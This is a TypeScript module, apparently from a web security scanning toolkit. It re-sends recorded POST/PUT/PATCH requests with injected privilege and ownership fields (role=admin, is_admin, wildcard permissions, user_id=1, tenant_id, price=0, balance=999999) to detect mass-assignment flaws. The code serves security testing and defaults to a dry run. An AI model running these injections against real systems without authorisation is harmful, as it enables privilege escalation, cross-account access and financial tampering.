import { fetchUrl } from "../adapters/http.js";
import { writeFile, mkdir, readFile } from "node:fs/promises";
import { join } from "node:path";

/** Mass-assignment radar over recorded traffic: takes the mutating exchanges
 *  (POST/PUT/PATCH) from a traffic recording and re-fires them with
 *  PRIVILEGE/OWNERSHIP fields INJECTED into the JSON body — fields that were
 *  never client-settable in the original request (role, is_admin, user_id,
 *  tenant_id, permissions, plan, price…). If the server binds them (reflected
 *  in the response, or response content changed vs the live baseline), the
 *  endpoint is a mass-assignment sink: a low-priv user can self-escalate by
 *  merely adding a field.
 *
 *  Difference from replay_tamper: tamper REPLACES existing business fields
 *  (price=0.01 on an order form); this ADDS fields the client never sent —
 *  the classic mass-assignment vector (CWE-915). Deterministic, no LLM. */

export interface MassAssignInput {
  /** traffic outputRoot (traffic.ndjson + blobs/) recorded as any user. */
  readonly recordRoot: string;
  readonly outputRoot: string;
  /** Credential for the replaying context (the would-be attacker). Same
   *  syntax as roleMatrix roles. Default: replay with the original recorded
   *  headers verbatim (minus hop-by-hop). */
  readonly credential?: string;
  readonly exchangeIds?: readonly string[];
  /** Candidate fields to inject; default INJECT_FIELDS. */
  readonly fields?: readonly string[];
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly maxExchanges?: number;
  /** Fire the injected replays (default dry-run: inventory only). Injecting
   *  role=admin into a live profile update is a real state change. */
  readonly apply?: boolean;
}

export interface InjectOutcome {
  readonly exchangeId: string;
  readonly method: string;
  readonly url: string;
  readonly field: string;
  readonly value: string;
  readonly baselineStatus: number;
  readonly replayStatus: number;
  readonly verdict: "reflected" | "accepted-changed" | "rejected" | "same-response" | "error" | "dry-run";
  readonly note: string;
}

export interface MassAssignResult {
  readonly probed: number;
  readonly outcomes: InjectOutcome[];
  /** reflected + accepted-changed = mass-assignment sinks. */
  readonly sinks: InjectOutcome[];
  readonly artifacts: { path: string; bytes: number }[];
}

/** Fields a client should never be able to set on its own record. Values are
 *  chosen to be obvious if echoed back. */
const INJECT_FIELDS: ReadonlyArray<{ field: string; value: unknown; note: string }> = [
  { field: "role", value: "admin", note: "role escalation" },
  { field: "roles", value: ["admin"], note: "role list escalation" },
  { field: "isAdmin", value: true, note: "admin flag" },
  { field: "is_admin", value: true, note: "admin flag" },
  { field: "admin", value: true, note: "admin flag" },
  { field: "permissions", value: ["*"], note: "wildcard permissions" },
  { field: "scopes", value: ["*"], note: "wildcard scopes" },
  { field: "user_id", value: 1, note: "ownership pivot to user 1" },
  { field: "userId", value: 1, note: "ownership pivot to user 1" },
  { field: "account_id", value: 1, note: "cross-account pivot" },
  { field: "tenant_id", value: 1, note: "cross-tenant pivot" },
  { field: "organizationId", value: 1, note: "cross-org pivot" },
  { field: "verified", value: true, note: "self-verify" },
  { field: "isVerified", value: true, note: "self-verify" },
  { field: "email_verified", value: true, note: "bypass verification flows" },
  { field: "active", value: true, note: "reactivation" },
  { field: "plan", value: "enterprise", note: "plan escalation" },
  { field: "subscription", value: "premium", note: "subscription escalation" },
  { field: "price", value: 0, note: "price override" },
  { field: "balance", value: 999999, note: "balance injection" },
  { field: "quota", value: 999999, note: "quota injection" },
];

const HOP_HEADERS = new Set(["host", "content-length", "connection", "transfer-encoding", "keep-alive", "upgrade"]);

interface RecordedExchange {
  readonly id: string;
  readonly method: string;
  readonly url: string;
  readonly reqHeaders: Record<string, string>;
  readonly reqBodyHash: string | null;
  readonly status: number | null;
  readonly respBodyHash: string | null;
}

const loadBlob = async (recordRoot: string, hash: string | null): Promise<string | null> => {
  if (!hash) return null;
  try {
    return await readFile(join(recordRoot, "blobs", hash.slice(0, 2), `${hash}.bin`), "utf8");
  } catch { return null; }
};

/** Inject a top-level field into a JSON body. Returns null when the body is
 *  not JSON or the field ALREADY exists (that's tamper territory, not
 *  mass-assignment — keep the two probes disjoint). */
const injectField = (body: string, field: string, value: unknown): string | null => {
  try {
    const j = JSON.parse(body) as unknown;
    if (j == null || typeof j !== "object" || Array.isArray(j)) return null;
    if (field in (j as Record<string, unknown>)) return null;
    return JSON.stringify({ ...(j as Record<string, unknown>), [field]: value });
  } catch { return null; }
};

/** Does the response mention the injected value in a way tied to the field?
 *  Reflection check: the JSON response contains the field with a non-null
 *  value (server stored it), or the raw string form appears. */
const isReflected = (respBody: string, field: string, value: unknown): boolean => {
  const head = respBody.slice(0, 8192);
  const v = typeof value === "string" ? value : JSON.stringify(value);
  if (head.includes(`"${field}"`)) {
    // field present in response — check it carries our value (or any truthy bind)
    try {
      const walk = (node: unknown): boolean => {
        if (Array.isArray(node)) return node.some(walk);
        if (node && typeof node === "object") {
          for (const [k, val] of Object.entries(node as Record<string, unknown>)) {
            if (k === field && val != null) return true;
            if (walk(val)) return true;
          }
        }
        return false;
      };
      if (walk(JSON.parse(respBody))) return true;
    } catch { /* non-JSON with the quoted field name — weak signal, fall through */ }
  }
  // raw value echo (JSON.stringify(array) -> ["admin"])
  return head.includes(`"${field}":${v}`) || head.includes(`"${field}": ${v}`) || (typeof value === "string" && head.includes(v) && head.includes(field));
};

export const probeMassAssign = async (input: MassAssignInput): Promise<MassAssignResult> => {
  await mkdir(input.outputRoot, { recursive: true });

  const lines = (await readFile(join(input.recordRoot, "traffic.ndjson"), "utf8")).split("\n").filter(Boolean);
  const all: RecordedExchange[] = [];
  for (const l of lines) {
    try { all.push(JSON.parse(l) as RecordedExchange); } catch { /* torn line */ }
  }
  const exchanges = all
    .filter((e) => ["POST", "PUT", "PATCH"].includes(e.method.toUpperCase()))
    .filter((e) => e.status != null && e.status >= 200 && e.status < 400)
    .filter((e) => (input.exchangeIds ? input.exchangeIds.includes(e.id) : true))
    .slice(0, input.maxExchanges ?? 15);

  const fields = input.fields
    ? INJECT_FIELDS.filter((f) => input.fields!.includes(f.field))
    : INJECT_FIELDS;
  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10000 };
  const outcomes: InjectOutcome[] = [];

  const mkHeaders = (e: RecordedExchange): Record<string, string> => {
    const h: Record<string, string> = {};
    for (const [k, v] of Object.entries(e.reqHeaders)) {
      if (HOP_HEADERS.has(k.toLowerCase())) continue;
      h[k.toLowerCase()] = v;
    }
    if (input.credential) {
      if (/^authorization\s*:/i.test(input.credential)) h.authorization = input.credential.replace(/^authorization\s*:\s*/i, "");
      else if (/^cookie\s*:/i.test(input.credential)) h.cookie = input.credential.replace(/^cookie\s*:\s*/i, "");
      else if (/^bearer\s+\S/i.test(input.credential)) h.authorization = input.credential;
      else h.cookie = input.credential;
    }
    return h;
  };

  for (const e of exchanges) {
    const body = await loadBlob(input.recordRoot, e.reqBodyHash);
    if (!body) continue; // no body to inject into (form-encoded handled below via query-style skip)
    try { JSON.parse(body); } catch { continue; } // JSON bodies only — form injection needs field-aware encoding

    if (input.apply !== true) {
      const injectable = fields.filter((f) => injectField(body, f.field, f.value) !== null);
      for (const f of injectable) {
        outcomes.push({ exchangeId: e.id, method: e.method, url: e.url, field: f.field, value: JSON.stringify(f.value), baselineStatus: e.status ?? 0, replayStatus: -1, verdict: "dry-run", note: f.note });
      }
      continue;
    }

    // LIVE baseline first (recorded response may be stale).
    const live = await fetchUrl(e.url, { ...opts, method: e.method, headers: mkHeaders(e), body });
    if (live.status === 0) continue;
    const liveFp = `${live.status}:${live.sha256.slice(0, 16)}`;

    for (const f of fields) {
      const injected = injectField(body, f.field, f.value);
      if (injected === null) continue;
      const r = await fetchUrl(e.url, { ...opts, method: e.method, headers: mkHeaders(e), body: injected });
      if (r.status === 0) {
        outcomes.push({ exchangeId: e.id, method: e.method, url: e.url, field: f.field, value: JSON.stringify(f.value), baselineStatus: live.status, replayStatus: 0, verdict: "error", note: r.error ?? "network" });
        continue;
      }
      const rFp = `${r.status}:${r.sha256.slice(0, 16)}`;
      const changed = rFp !== liveFp;
      let verdict: InjectOutcome["verdict"];
      let note = f.note;
      if (r.status >= 200 && r.status < 300 && isReflected(r.body, f.field, f.value)) {
        verdict = "reflected"; note = `${f.note} — field bound in response`;
      } else if (r.status >= 200 && r.status < 300 && changed) {
        verdict = "accepted-changed"; note = `${f.note} — response changed on injection`;
      } else if (r.status >= 400 && r.status < 500) {
        verdict = "rejected"; note = `${f.note} — rejected ${r.status}`;
      } else {
        verdict = "same-response"; note = f.note;
      }
      outcomes.push({ exchangeId: e.id, method: e.method, url: e.url, field: f.field, value: JSON.stringify(f.value), baselineStatus: live.status, replayStatus: r.status, verdict, note });
    }
  }

  const sinks = outcomes.filter((o) => o.verdict === "reflected" || o.verdict === "accepted-changed");
  const bodyStr = JSON.stringify({ probed: exchanges.length, outcomes, sinks }, null, 2);
  const path = join(input.outputRoot, "mass_assign.json");
  await writeFile(path, bodyStr, "utf8");
  return { probed: exchanges.length, outcomes, sinks, artifacts: [{ path, bytes: Buffer.byteLength(bodyStr) }] };
};
